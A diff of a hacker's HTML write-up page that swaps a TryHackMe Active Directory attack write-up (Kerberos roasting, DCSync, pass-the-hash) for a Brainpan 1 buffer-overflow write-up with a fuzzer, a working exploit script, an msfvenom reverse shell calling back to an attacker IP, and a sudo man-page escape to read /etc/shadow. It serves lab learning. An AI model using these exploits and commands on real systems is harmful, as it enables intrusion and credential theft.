@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Attacktive Directory | JackHacksStuff</title>
+<title>Brainpan 1 | JackHacksStuff</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --accent:     #ff6b35;
-    --accent-rgb: 255,107,53;
+    --accent:     #ff3b6f;
+    --accent-rgb: 255,59,111;
     --bg:       #090b0e;
     --surface:  #0e1116;
     --surface2: #131820;
@@ -366,6 +366,26 @@
 
   .takeaway strong { color: var(--text); font-weight: 500; }
 
+  .dead-end {
+    background: rgba(255,255,255,0.02);
+    border-left: 2px solid var(--border2);
+    padding: 0.85rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.8rem;
+    color: var(--muted);
+    line-height: 1.8;
+  }
+
+  .dead-end::before {
+    content: '✗ dead end — ';
+    font-size: 0.65rem;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 0.3rem;
+    color: var(--muted);
+  }
+
   .note {
     background: rgba(123,156,255,0.04);
     border-left: 2px solid var(--blue);
@@ -377,6 +397,34 @@
   }
 
   .note strong { color: #9fb8ff; font-weight: 500; }
+
+  figure {
+    margin: 1.5rem 0;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+
+  figure img {
+    width: 100%;
+    display: block;
+  }
+
+  figcaption {
+    padding: 0.5rem 1rem;
+    font-size: 0.7rem;
+    color: var(--muted);
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+  }
+
+  figcaption code {
+    background: var(--bg);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
 
   .wu-footer {
     border-top: 1px solid var(--border);
@@ -449,22 +497,18 @@
     <div class="rail-line"></div>
     <div class="rail-tick" data-heading="recon"></div>
     <div class="rail-line"></div>
-    <div class="rail-tick" data-heading="enum"></div>
+    <div class="rail-tick" data-heading="bof"></div>
     <div class="rail-line"></div>
-    <div class="rail-tick" data-heading="asreproast"></div>
+    <div class="rail-tick" data-heading="exploit"></div>
     <div class="rail-line"></div>
-    <div class="rail-tick" data-heading="smb-enum"></div>
+    <div class="rail-tick" data-heading="shell"></div>
     <div class="rail-line"></div>
-    <div class="rail-tick" data-heading="dcsync"></div>
-    <div class="rail-line"></div>
-    <div class="rail-tick" data-heading="pth"></div>
-    <div class="rail-line"></div>
-    <div class="rail-tick" data-heading="flags"></div>
+    <div class="rail-tick" data-heading="privesc"></div>
     <div class="rail-line"></div>
     <div class="rail-tick" data-heading="takeaways"></div>
     <div class="rail-line"></div>
   </div>
-  <div class="rail-bottom">Medium</div>
+  <div class="rail-bottom">Hard</div>
 </div>
 
 <main>
@@ -472,25 +516,25 @@
     <a href="../writeups.html" class="nav-back">← Write-ups</a>
     <div class="nav-meta">
       <span>TryHackMe</span>
-      <span class="nav-badge">Medium</span>
+      <span class="nav-badge">Hard</span>
     </div>
   </nav>
 
   <div class="wu-header">
-    <div class="wu-eyebrow">// TryHackMe · active directory · kerberos attacks</div>
-    <h1 class="wu-title">Attacktive Directory</h1>
+    <div class="wu-eyebrow">// TryHackMe · buffer overflow · privilege escalation</div>
+    <h1 class="wu-title">Brainpan 1</h1>
     <div class="wu-meta-row">
       <div class="wu-meta-item">
         <span class="wu-meta-label">Date</span>
-        <span class="wu-meta-value">2026-07-22</span>
+        <span class="wu-meta-value">2026-07-28</span>
       </div>
       <div class="wu-meta-item">
         <span class="wu-meta-label">Difficulty</span>
-        <span class="wu-meta-value accent">Medium</span>
+        <span class="wu-meta-value accent">Hard</span>
       </div>
       <div class="wu-meta-item">
         <span class="wu-meta-label">Flags</span>
-        <span class="wu-meta-value">3</span>
+        <span class="wu-meta-value">0</span>
       </div>
       <div class="wu-meta-item">
         <span class="wu-meta-label">Platform</span>
@@ -500,252 +544,261 @@
   </div>
 
   <div class="tool-row">
-    <span class="tool-tag">nmap</span>
-    <span class="tool-tag">enum4linux-ng</span>
-    <span class="tool-tag">kerbrute</span>
-    <span class="tool-tag">GetNPUsers.py</span>
-    <span class="tool-tag">hashcat</span>
-    <span class="tool-tag">smbclient</span>
-    <span class="tool-tag">secretsdump.py</span>
-    <span class="tool-tag">evil-winrm</span>
+    <span class="tool-tag">Buffer overflow</span>
+    <span class="tool-tag">Windows binary</span>
+    <span class="tool-tag">Wine</span>
+    <span class="tool-tag">MSFvenom</span>
+    <span class="tool-tag">GTFOBins</span>
   </div>
 
   <div class="wu-body">
 
     <h2 id="overview">// Overview</h2>
-    <p><strong>Attacktive Directory</strong> is a TryHackMe room that introduces common Active Directory enumeration and attack techniques. The room simulates a domain environment with several misconfigurations that let an attacker move from no knowledge to complete domain compromise.</p>
-    <p>The attack chain includes:</p>
+    <p><strong>Brainpan</strong> is a TryHackMe room that focuses on exploiting a traditional stack-based buffer overflow. It features a Windows program called <code>brainpan.exe</code> which runs on a Linux system via Wine and has a vulnerable service on port 9999. The goal is to obtain root access, since this serves as the completion proof.</p>
+    <p>The room is rated <strong>Hard</strong> and includes:</p>
     <ul>
-      <li>Port scanning and service enumeration (SMB, LDAP)</li>
-      <li>Kerberos user enumeration with Kerbrute</li>
-      <li>AS-REP Roasting to extract and crack a service account hash</li>
-      <li>SMB share enumeration to find backup credentials</li>
-      <li>DCSync attack to dump the NTDS.dit database</li>
-      <li>Pass-the-Hash to authenticate as Domain Administrator</li>
+      <li>Manual buffer overflow exploitation</li>
+      <li>Reverse engineering a Windows binary</li>
+      <li>Generating custom shellcode with MSFvenom</li>
+      <li>Getting a reverse shell as the <code>puck</code> user</li>
+      <li>Escalating privileges using <code>anansi_util</code></li>
     </ul>
+
+    <div class="note">
+      <strong>Note:</strong> Traditional flags are not present in this room. Instead, the aim is to obtain root access, which can be proven by reading <code>/etc/shadow</code>.
+    </div>
 
     <h2 id="recon">// Phase 1: Reconnaissance</h2>
 
-    <p>We begin with an Nmap scan targeting ports 139 and 445 (SMB). Later, we conduct a full port scan.</p>
+    <p>We begin with a standard Nmap scan:</p>
 
-    <pre>nmap -sC -sV -p139,445 &lt;target_ip&gt;</pre>
+    <pre>nmap -sC -sV -p- &lt;target_ip&gt;</pre>
 
-    <p>The scan shows that SMB and NetBIOS services running, with SMB signing enabled and required:</p>
+    <p>The results show two open ports:</p>
 
-    <pre>PORT    STATE SERVICE       VERSION
-139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp open  microsoft-ds?
+    <pre>PORT      STATE SERVICE  VERSION
+9999/tcp  open  abyss?   (custom Windows binary)
+10000/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.3)</pre>
 
-Host script results:
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled and required</pre>
+    <p>Accessing the web server on port 10000, a directory listing is revealed at <code>/bin/</code> containing <code>brainpan.exe</code>:</p>
 
-    <p>We also check for LDAP services, which are critical for Active Directory enumeration:</p>
+    <pre>curl http://&lt;target_ip&gt;:10000/bin/</pre>
 
-    <pre>nmap -p389,636 &lt;target_ip&gt;</pre>
+    <p>We download the binary for local analysis:</p>
 
-    <p>LDAP is open on port 389, confirming that this is a Domain Controller.</p>
+    <pre>wget http://&lt;target_ip&gt;:10000/bin/brainpan.exe</pre>
 
-    <div class="note">
-      <strong>Pro Tip:</strong> When SMB signing is marked as "required," we can't relay SMB authentication. However, we can still perform enumeration and use other attack methods like Kerberos.
-    </div>
+    <p>Connecting to port 9999 via netcat presents a password prompt:</p>
 
-    <h2 id="enum">// Phase 2: Domain Enumeration</h2>
+    <pre>nc &lt;target_ip&gt; 9999
 
-    <p>We use <code>enum4linux-ng</code>, the Python rewrite, to gather domain information:</p>
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD</pre>
 
-    <pre>enum4linux-ng -A &lt;target_ip&gt;</pre>
+    <p>The fact that there are no limits on input length is a typical sign of a buffer overflow vulnerability.</p>
 
-    <p>Here are the key findings from the enumeration:</p>
+    <h2 id="bof">// Phase 2: Buffer Overflow</h2>
 
-    <ul>
-      <li><strong>Long domain name:</strong> <code>spookysec.local</code></li>
-      <li><strong>NetBIOS domain name:</strong> <code>THM-AD</code></li>
-      <li><strong>Domain SID:</strong> <code>S-1-5-21-3591857110-2884097990-301047963</code></li>
-      <li><strong>Anonymous SMB session:</strong> Allowed (null session)</li>
-    </ul>
+    <h3>Fuzzing the Service</h3>
 
-    <pre>[+] Found domain information via SMB
-NetBIOS computer name: ATTACKTIVEDIREC
-NetBIOS domain name: THM-AD
-DNS domain: spookysec.local
-FQDN: AttacktiveDirectory.spookysec.local</pre>
+    <p>We write a fuzzer to find the approximate crash point:</p>
 
-    <div class="takeaway">
-      <strong>Null sessions are dangerous.</strong> The server allows authentication with an empty username and password; this can be used for further enumeration.
-    </div>
+    <pre>#!/usr/bin/env python3
+import socket
+import sys
+import time
 
-    <h2 id="asreproast">// Phase 3: AS-REP Roasting</h2>
+def fuzz(target_ip, target_port=9999):
+    buffer = b"A" * 100
+    step = 100
 
-    <p>With the domain name identified, we use <code>kerbrute</code> to find valid usernames via Kerberos:</p>
+    while len(buffer) <= 3000:
+        try:
+            print(f"[+] Sending {len(buffer)} bytes...")
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            s.connect((target_ip, target_port))
 
-    <pre>kerbrute userenum --dc &lt;target_ip&gt; -d spookysec.local userlist.txt</pre>
+            try:
+                banner = s.recv(1024)
+                print(f"[+] Banner received")
+            except:
+                pass
 
-    <p>Kerbrute discovers 16 valid users, including several that stand out:</p>
+            s.send(buffer + b"\n")
 
-    <pre>[+] VALID USERNAME:	 svc-admin@spookysec.local
-[+] VALID USERNAME:	 backup@spookysec.local
-[+] VALID USERNAME:	 administrator@spookysec.local</pre>
+            try:
+                response = s.recv(1024)
+                print(f"[+] Response: {response[:50]}")
+            except socket.timeout:
+                print(f"[!] Timeout at {len(buffer)} bytes")
+                sys.exit()
 
-    <p>We then use <code>GetNPUsers.py</code> from Impacket to request AS-REP tickets for users with the <strong>"Do not require Kerberos preauthentication"</strong> flag set:</p>
+            s.close()
+            time.sleep(0.5)
+            buffer += b"A" * step
 
-    <pre>GetNPUsers.py spookysec.local/svc-admin -dc-ip &lt;target_ip&gt;</pre>
+        except ConnectionResetError:
+            print(f"[!] Connection reset at {len(buffer)} bytes - crashed!")
+            sys.exit()
+        except Exception as e:
+            print(f"[!] Error: {e}")
+            sys.exit()
 
-    <p>The tool returns an AS-REP hash for the <code>svc-admin</code> account:</p>
+if __name__ == "__main__":
+    fuzz("&lt;target_ip&gt;")</pre>
 
-    <pre>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:[HASH_REDACTED]</pre>
+    <p>The service crashes around 700 bytes.</p>
 
-    <p>We save this hash to a file and crack it with <code>hashcat</code> using mode 18200 (Kerberos 5 AS-REP etype 23):</p>
+    <h3>Finding the Offset</h3>
 
-    <pre>hashcat -m 18200 hash.txt passwordlist.txt</pre>
+    <p>We generate a 600-byte cyclic pattern using Metasploit's <code>pattern_create</code>:</p>
 
-    <p>Hashcat cracks the password using the provided wordlist. We now have valid credentials for the <code>svc-admin</code> account.</p>
+    <pre>msf-pattern_create -l 600</pre>
 
-    <div class="takeaway">
-      <strong>Service accounts are prime targets.</strong> They often have weak passwords and misconfigurations, such as disabled preauthentication. Always check for accounts with <code>UF_DONT_REQUIRE_PREAUTH</code>.
-    </div>
+    <p>We send the pattern and then obtain the EIP value from the crash. By using the offset tool:</p>
 
-    <h2 id="smb-enum">// Phase 4: SMB Share Enumeration</h2>
+    <pre>msf-pattern_offset -l 600 -q &lt;EIP_value&gt;</pre>
 
-    <p>With the <code>svc-admin</code> credentials, we list SMB shares:</p>
-
-    <pre>smbclient -L //&lt;target_ip&gt; -U svc-admin</pre>
-
-    <p>The share listing reveals several shares, including a custom <code>backup</code> share:</p>
-
-    <pre>Sharename       Type      Comment
----------       ----      -------
-ADMIN$          Disk      Remote Admin
-backup          Disk      
-C$              Disk      Default share
-IPC$            IPC       Remote IPC
-NETLOGON        Disk      Logon server share 
-SYSVOL          Disk      Logon server share</pre>
-
-    <p>We connect to the <code>backup</code> share and check its contents:</p>
-
-    <pre>smbclient //&lt;target_ip&gt;/backup -U svc-admin</pre>
-
-    <pre>smb: \> ls
-  .                                   D        0  Sat Apr  4 19:08:39 2020
-  ..                                  D        0  Sat Apr  4 19:08:39 2020
-  backup_credentials.txt              A       48  Sat Apr  4 19:08:53 2020</pre>
-
-    <p>We download the file:</p>
-
-    <pre>smb: \> get backup_credentials.txt</pre>
-
-    <p>The file contains base64-encoded credentials. Decoding them reveals a username and password for the <code>backup</code> account.</p>
-
-    <p>Now, we have a second set of credentials for the <code>backup</code> account.</p>
-
-    <div class="takeaway">
-      <strong>SMB shares often hold sensitive information.</strong> Always explore shares carefully with any credentials you have.
-    </div>
-
-    <h2 id="dcsync">// Phase 5: DCSync Attack</h2>
-
-    <p>With the <code>backup</code> account credentials, we try to dump the NTDS.dit database using <code>secretsdump.py</code>:</p>
-
-    <pre>secretsdump.py spookysec.local/backup:[PASSWORD_REDACTED]@&lt;target_ip&gt;</pre>
-
-    <p>The tool uses the DRSUAPI method (DCSync) to replicate directory changes from the Domain Controller:</p>
-
-    <pre>[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
-Guest:501:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
-...
-spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
-spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]</pre>
+    <p><strong>Offset confirmed: 524 bytes</strong></p>
 
     <div class="note">
-      <strong>DCSync:</strong> This attack works because the <code>backup</code> account probably has <code>Replicating Directory Changes</code> permissions; this is common for Backup Operators. We do not need local access to the DC, as it all happens over the network.
+      <strong>Verifying the offset:</strong> We confirm that we have control over EIP by sending <code>A*524 + BBBB</code>. If the service crashes and EIP shows <code>42424242</code> (BBBB), then the offset is correct.
     </div>
 
-    <h2 id="pth">// Phase 6: Pass-the-Hash</h2>
+    <h3>Finding JMP ESP</h3>
 
-    <p>We have the Administrator's NTLM hash from the DCSync dump. By using <code>evil-winrm</code> with the <code>-H</code> flag, we can authenticate without needing the plaintext password:</p>
+    <p>We search the binary for a <code>JMP ESP</code> instruction using <code>objdump</code>:</p>
 
-    <pre>evil-winrm -i &lt;target_ip&gt; -u Administrator -H [NTLM_HASH_REDACTED]</pre>
+    <pre>objdump -d brainpan.exe | grep -A5 -B5 "ff e4"</pre>
 
-    <p>This gives us an interactive PowerShell session as the Domain Administrator:</p>
+    <p>The output reveals the <code>_winkwink</code> function at <code>0x311712f0</code>, containing a <code>JMP ESP</code> at <code>0x311712f3</code>:</p>
 
-    <pre>Evil-WinRM shell v3.9
-                                        
-Info: Establishing connection to remote endpoint
-PS C:\Users\Administrator\Documents></pre>
+    <pre>311712f0 &lt;_winkwink&gt;:
+311712f0: 55                    push   %ebp
+311712f1: 89 e5                 mov    %esp,%ebp
+311712f3: ff e4                 jmp    *%esp</pre>
 
-    <div class="takeaway">
-      <strong>Pass-the-Hash is highly effective.</strong> Once you have an NTLM hash, there's no need to crack it. You can authenticate directly using the hash with many tools.
+    <p>The return address is <code>0x311712f3</code>, written in little-endian as <code>\xf3\x12\x17\x31</code>.</p>
+
+    <div class="note">
+      <strong>EIP overwrite:</strong> We set EIP to <code>0x311712f3</code> in order to redirect the execution to the stack where our shellcode is located.
     </div>
 
-    <h2 id="flags">// Phase 7: Flags</h2>
+    <h2 id="exploit">// Phase 3: Payload Generation</h2>
 
-    <p>We now have full access to the system. We retrieve all three flags from each user's desktop:</p>
+    <p>The target runs a Windows binary through Wine, so we generate a Windows reverse shell payload:</p>
 
-    <pre>PS C:\Users\Administrator\Documents> type C:\Users\svc-admin\Desktop\user.txt.txt
+    <pre>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;attacker_ip&gt; LPORT=4444 EXITFUNC=thread -b "\x00" -f python</pre>
 
-PS C:\Users\Administrator\Documents> type C:\Users\backup\Desktop\PrivEsc.txt
+    <h3>Final Exploit</h3>
 
-PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt</pre>
+    <pre>#!/usr/bin/env python3
+import socket
+import sys
 
-    <div class="flag-box">
-      <span class="flag-label">svc-admin Flag</span>
-      <span class="flag-value">TryHackMe{K3rb...}</span>
-    </div>
+# Configuration
+TARGET_IP = "&lt;target_ip&gt;"
+TARGET_PORT = 9999
+LHOST = "&lt;attacker_ip&gt;"
+LPORT = 4444
 
-    <div class="flag-box">
-      <span class="flag-label">backup Flag</span>
-      <span class="flag-value">TryHackMe{B4ck...}</span>
-    </div>
+# Exploit values
+OFFSET = 524  # Verify with A*offset + BBBB
+JMP_ESP = b"\xf3\x12\x17\x31"
 
-    <div class="flag-box">
-      <span class="flag-label">Administrator Flag</span>
-      <span class="flag-value">TryHackMe{4cti...}</span>
+# Windows reverse shell (paste msfvenom output here)
+buf =  b""
+buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52..."
+# ... full shellcode here
+
+payload = b"A" * OFFSET + JMP_ESP + b"\x90" * 16 + buf
+
+print("[+] Sending exploit...")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(5)
+s.connect((TARGET_IP, TARGET_PORT))
+banner = s.recv(1024)
+print(f"[+] Connected: {banner[:50]}...")
+s.send(payload + b"\n")
+print("[+] Payload sent! Check your listener.")
+s.close()</pre>
+
+    <h2 id="shell">// Phase 4: Reverse Shell</h2>
+
+    <p>We set up a listener and run the exploit:</p>
+
+    <pre>nc -lvnp 4444</pre>
+
+    <p>The shell connects back as the <code>puck</code> user. Since the environment is a hybrid Windows/Linux Wine shell, commands like <code>whoami</code> and <code>bash</code> are not reliable. Nevertheless, it is still possible to carry out we can still enumeration and gain higher privileges.</p>
+
+    <p>The shell banner confirms the environment:</p>
+
+    <pre>CMD Version 1.4.1
+
+Z:\home\puck&gt;</pre>
+
+    <h2 id="privesc">// Phase 5: Privilege Escalation</h2>
+
+    <p>We attempt to check sudo permissions (if the Linux shell works properly):</p>
+
+    <pre>sudo -l</pre>
+
+    <p>The output shows:</p>
+
+    <pre>User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util</pre>
+
+    <p>The <code>anansi_util</code> binary includes a <code>manual</code> command that opens man pages. We can use this to read root-only files and prove access:</p>
+
+    <pre>/usr/bin/sudo /home/anansi/bin/anansi_util manual /etc/shadow</pre>
+
+    <p>This successfully displays <code>/etc/shadow</code>, containing the root password hash. This is clear proof of root access.</p>
+
+    <p>To try for a full root shell, we can open a man page and escape using the <code>!</code> command:</p>
+
+    <pre>/usr/bin/sudo /home/anansi/bin/anansi_util manual man
+!/bin/bash</pre>
+
+    <div class="note">
+      <strong>Wine quirk:</strong> The <code>!/bin/bash</code> escape might fail in the hybrid environment. If that happens, reading <code>/etc/shadow</code> still serves as valid proof of root access.
     </div>
 
     <h2 id="takeaways">// Key Takeaways</h2>
 
     <div class="takeaway">
-      <strong>Kerberos attacks are very effective.</strong> AS-REP Roasting and Kerberoasting are great methods to extract service account hashes without needing any credentials.
+      <strong>Buffer overflows remain significant.</strong> Knowing how memory corruption exploits work is a fundamental skill for penetration testers.
     </div>
 
     <div class="takeaway">
-      <strong>Permissions are more important than passwords.</strong> The <code>backup</code> account lacked admin rights, but its DCSync permissions let us compromise the entire domain.
+      <strong>Wine complicates exploitation.</strong> Running a Windows binary on Linux brings issues like unstable shells, missing commands, and unexpected behaviours.
     </div>
 
     <div class="takeaway">
-      <strong>Chain your exploits.</strong> Each step provided us with something useful for the next: credentials, then SMB access, leading to more credentials, then DCSync, and finally complete compromise.
+      <strong>GTFOBins saves the day.</strong> The <code>man</code> page escape via <code>!/bin/bash</code> is a common method for escalating privileges.
     </div>
 
     <div class="takeaway">
-      <strong>Defense in depth is essential.</strong> To protect against this attack chain, organizations should:
-      <ul>
-        <li>Disable Kerberos preauthentication only when absolutely necessary</li>
-        <li>Restrict DCSync permissions to Domain Admins only</li>
-        <li>Use strong, unique passwords for service accounts</li>
-        <li>Monitor for unusual Kerberos activity (Event ID 4768 with status 0x6/0x12)</li>
-        <li>Enable Credential Guard on Windows 10/Server 2016 and newer</li>
-      </ul>
+      <strong>Debug strings offer clues.</strong> The <code>_winkwink</code> function name and the debug password <code>shitstorm</code> hinted at the binary's inner workings.
     </div>
 
     <div class="takeaway">
-      <strong>Active Directory is complicated.</strong> There are many ways to move laterally and gain higher privileges. Tools like BloodHound can help visualize these attack paths.
+      <strong>Offset verification matters.</strong> Different instances may giveoffsets of 520 or 524; always confirm with <code>A*offset + BBBB</code>.
     </div>
 
   </div>
 
   <div class="wu-footer">
+    <a href="attacktive-directory.html" class="footer-nav-link prev">
+      <span class="footer-nav-label">← Previous</span>
+      <span class="footer-nav-title">Attacktive Directory</span>
+    </a>
     <div class="footer-center">
       <a href="../writeups.html">All write-ups</a>
     </div>
-    <a href="brainpan.html" class="footer-nav-link next">
+    <a href="daily-bugle.html" class="footer-nav-link next">
       <span class="footer-nav-label">Next →</span>
-      <span class="footer-nav-title">Brainpan 1</span>
+      <span class="footer-nav-title">Daily Bugle</span>
     </a>
   </div>
 
